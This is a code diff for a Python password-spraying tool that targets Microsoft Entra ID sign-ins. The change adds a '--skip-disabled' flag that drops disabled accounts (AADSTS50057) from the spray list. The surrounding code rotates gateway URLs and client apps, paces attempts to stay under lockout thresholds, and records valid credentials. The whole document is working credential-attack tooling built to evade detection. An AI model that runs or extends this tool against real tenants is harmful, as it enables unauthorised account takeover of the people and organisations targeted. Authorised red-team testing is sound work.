@@ -470,13 +470,15 @@ def perform_auth(target, gateway_url, tenant, app_config, proxy_dict=None):
 
 def process_attempt(
     target, apim_manager, tenant, pace_config, logger,
-    locked_users_set, invalid_users_set, lockout_counts,
-    lock, continue_on_success, stop_event,
+    locked_users_set, invalid_users_set, disabled_users_set, lockout_counts,
+    lock, continue_on_success, skip_disabled, stop_event,
 ):
     if stop_event.is_set():
         return
     with lock:
         if target.username in locked_users_set or target.username in invalid_users_set:
+            return
+        if skip_disabled and target.username in disabled_users_set:
             return
     app_config = random.choice(CLIENT_APPS)
     gateway_url = apim_manager.get_next_url()
@@ -553,6 +555,11 @@ def process_attempt(
     else:
         logger.log_result("failed", file_msg)
 
+    if skip_disabled and classification == "BLOCKED (Account Disabled)":
+        with lock:
+            disabled_users_set.add(target.username)
+        print_warn(f"Disabled account detected — removing {style(target.username, TermColors.YELLOW)} from spray list.")
+
     is_valid_credential = classification.startswith("VALID") or classification == "BLOCKED (Account Disabled)"
     if is_valid_credential and not continue_on_success:
         print_success("Valid credentials found. Stopping as --continue-on-success is not set.")
@@ -601,6 +608,7 @@ def main():
         ),
     )
     parser.add_argument("--continue-on-success", action="store_true", help="Continue after finding valid credentials.")
+    parser.add_argument("--skip-disabled", action="store_true", help="Remove disabled accounts (AADSTS50057) from the spray list as they are discovered.")
     parser.add_argument("--randomize-users", action="store_true", help="Randomize user order before each round.")
     parser.add_argument("--verbose", action="store_true", help="Enable on-demand progress output (press Enter to see progress).")
 
@@ -725,6 +733,7 @@ def main():
 
     locked_users_set = set()
     invalid_users_set = set()
+    disabled_users_set = set()
     lockout_counts = {}
     lock = threading.Lock()
     stop_event = threading.Event()
@@ -749,8 +758,8 @@ def main():
                     time.sleep(current_delay)
                 future = executor.submit(
                     process_attempt, target, apim_manager, args.tenant or "common", pace_config,
-                    logger, locked_users_set, invalid_users_set, lockout_counts,
-                    lock, args.continue_on_success, stop_event,
+                    logger, locked_users_set, invalid_users_set, disabled_users_set, lockout_counts,
+                    lock, args.continue_on_success, args.skip_disabled, stop_event,
                 )
                 futures.append(future)
             for f in as_completed(futures):
@@ -794,9 +803,12 @@ def main():
                         print_error(f"Safe threshold reached ({pace_config['safe']} lockouts). Terminating.")
                         if progress_tracker:
                             progress_tracker.end_session()
-                        _print_summary(logger, locked_users_set, invalid_users_set)
+                        _print_summary(logger, locked_users_set, invalid_users_set, disabled_users_set)
                         sys.exit(1)
-                current_targets = [Target(u, password) for u in users if u not in locked_users_set and u not in invalid_users_set]
+                current_targets = [Target(u, password) for u in users
+                                   if u not in locked_users_set
+                                   and u not in invalid_users_set
+                                   and u not in disabled_users_set]
                 if args.randomize_users:
                     random.shuffle(current_targets)
                 run_assessment(current_targets, progress_label=f"Password: {password}")
@@ -811,7 +823,7 @@ def main():
         if progress_tracker:
             progress_tracker.end_session()
 
-    _print_summary(logger, locked_users_set, invalid_users_set)
+    _print_summary(logger, locked_users_set, invalid_users_set, disabled_users_set)
 
 
 def _run_enumerate(args):
@@ -897,7 +909,7 @@ def _print_enum_summary(logger, valid_users, all_users, counters):
     print(style("----------------------------", TermColors.BOLD, TermColors.CYAN))
 
 
-def _print_summary(logger, locked_users, invalid_users):
+def _print_summary(logger, locked_users, invalid_users, disabled_users=None):
     print("\n" + style("--- Assessment Summary ---", TermColors.BOLD, TermColors.CYAN))
     valid_count = sum(1 for _ in open(logger.files["valid"])) if logger.files["valid"].exists() else 0
     blocked_count = sum(1 for _ in open(logger.files["blocked"])) if logger.files["blocked"].exists() else 0
@@ -909,8 +921,9 @@ def _print_summary(logger, locked_users, invalid_users):
     print(f"Failed Attempts:     {style(str(failed_count), TermColors.RED)}")
     print(f"Locked Users:        {style(str(len(locked_users)), TermColors.YELLOW)}")
     print(f"Users Not Found:     {style(str(len(invalid_users)), TermColors.YELLOW, TermColors.BOLD)}")
+    if disabled_users:
+        print(f"Disabled Accounts:   {style(str(len(disabled_users)), TermColors.YELLOW, TermColors.BOLD)} (removed from spray)")
     if invalid_users:
-        # List the not-found users
         for u in sorted(invalid_users):
             print(f"  {style('-', TermColors.DIM)} {u}")
     print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
